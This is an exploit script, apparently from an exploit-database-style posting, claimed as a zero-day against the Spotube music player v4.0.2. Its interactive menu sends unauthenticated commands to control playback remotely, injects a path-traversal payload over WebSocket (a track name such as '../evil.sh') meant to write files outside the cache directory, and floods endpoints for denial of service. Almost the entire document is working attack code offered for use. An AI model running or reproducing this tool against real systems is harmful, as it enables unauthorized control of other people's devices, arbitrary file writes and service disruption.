#!/usr/bin/env python3
import http.client
# Exploit Title: Remote manipulate
# Exploit Author: suicidal_teddy
# Date:24 april 2025
# Vendor Homepage: https://github.com/KRTirtho/spotube
# Version:v4.0.2
# Tested on: on kali linux

#x.com/ayuumimainuwu
#http://mastodon.social/@suicidal_teddy
#http://youtube.com/@suicidalteddy
#https://discord.gg/gtn7cMrJmd
# my first zero day allows any user to Remote manipulate music player
# requires pip install requests and pip install websockets



# Custom headers to emulate BurpSuite-style browser requests
#!/usr/bin/env python3
import http.client
import asyncio
import json
import time
import websockets  # pip install websockets

# mimic a real browser
BROWSER_HEADERS = {
    "Accept-Language": "en-US,en;q=0.9",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                  "(KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
    "Accept": ("text/html,application/xhtml+xml,application/xml;q=0.9,"
               "image/avif,image/webp,image/apng,*/*;q=0.8,"
               "application/signed-exchange;v=b3;q=0.7"),
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
}

def http_cmd(host: str, port: str, path: str):
    conn = None
    try:
        conn = http.client.HTTPConnection(host, int(port), timeout=5)
        conn.putrequest("GET", path, skip_host=True)
        conn.putheader("Host", f"{host}:{port}")
        for header, value in BROWSER_HEADERS.items():
            conn.putheader(header, value)
        conn.endheaders()

        resp = conn.getresponse()
        body = resp.read().decode(errors="replace").strip()
        print(f"{path} → {resp.status} {resp.reason}")
        if body:
            print(body)

    except Exception as e:
        print(f"Error calling {path}: {e}")
    finally:
        if conn:
            conn.close()

async def ws_inject_path_traversal(host: str, port: str):
    """
    Sends a malicious 'load' event over WS with a track name containing ../
    that will be used to write outside the cache dir when /stream/<id> is fetched.
    """
    malicious_name = input("Enter malicious filename (e.g. ../evil.sh): ").strip() or "../evil.sh"
    track_id      = input("Enter fake track ID (e.g. INJECT1): ").strip() or "INJECT1"
    codec         = input("Enter codec extension (e.g. mp3): ").strip() or "mp3"

    payload = {
        "type": "load",
        "data": {
            "tracks": [
                {
                    "name": malicious_name,
                    "artists": {"asString": ""},     # minimal stub
                    "sourceInfo": {"id": track_id},
                    "codec": {"name": codec}
                }
            ]
        }
    }

    ws_url = f"ws://{host}:{port}/ws"
    print(f"Connecting to {ws_url} …")
    try:
        async with websockets.connect(ws_url) as ws:
            await ws.send(json.dumps(payload))
            print("▶️  Malicious load payload sent:")
            print(json.dumps(payload, indent=2))
    except Exception as e:
        print("WebSocket error:", e)

def dos_flood(host: str, port: str, path: str, count: int, delay: float):
    """
    Floods the given endpoint with `count` rapid requests (with optional delay).
    """
    print(f"⚠️  Flooding {path} {count} times (delay {delay}s)…")
    for i in range(count):
        http_cmd(host, port, path)
        if delay > 0:
            time.sleep(delay)
    print("🔥  Done flood.")

def main():
    print("⚙️  Spotube Advanced Exploit CLI\n")
    host = input("Host [192.168.21.76]: ").strip() or "192.168.21.76"
    port = input("Port [17086]: ").strip() or "17086"

    actions = {
        '1': ("Ping server",                   lambda: http_cmd(host,port,"/ping")),
        '2': ("Next track",                    lambda: http_cmd(host,port,"/playback/next")),
        '3': ("Previous track",                lambda: http_cmd(host,port,"/playback/previous")),
        '4': ("Toggle play/pause",             lambda: http_cmd(host,port,"/playback/toggle-playback")),
        '5': ("Inject path-traversal via WS",  lambda: asyncio.run(ws_inject_path_traversal(host,port))),
        '6': ("Flood HTTP endpoint (DoS)",     lambda: do_flood_prompt(host, port)),
        '7': ("Exit",                          None),
    }

    def print_menu():
        print("\n=== Menu ===")
        for key in sorted(actions.keys(), key=int):
            print(f"{key}. {actions[key][0]}")

    def do_flood_prompt(h, p):
        path  = input("Endpoint to flood (e.g. /playback/next): ").strip()
        cnt   = int(input("Number of requests [100]: ").strip() or 100)
        delay = float(input("Delay between requests (s) [0]: ").strip() or 0)
        dos_flood(h, p, path, cnt, delay)

    while True:
        print_menu()
        choice = input("Choose an option: ").strip()
        if choice not in actions:
            print("❌  Invalid choice.")
            continue
        if choice == '7':
            print("👋  Goodbye!")
            break
        # run the associated lambda
        try:
            actions[choice][1]()
        except Exception as e:
            print("Error running action:", e)

if __name__ == "__main__":
    main()

